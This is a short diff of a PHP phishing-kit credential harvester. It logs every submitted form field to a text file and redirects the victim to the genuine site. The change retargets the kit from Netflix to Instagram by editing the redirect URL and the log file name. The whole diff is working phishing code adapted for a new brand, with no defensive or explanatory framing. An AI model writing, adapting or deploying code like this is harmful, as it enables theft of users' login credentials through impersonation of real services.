@@ -1,6 +1,6 @@
 <?php
-header ('Location:https://www.netflix.com/');
-$handle = fopen("netflix.txt", "a");
+header ('Location:https://www.instagram.com/');
+$handle = fopen("instagram.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
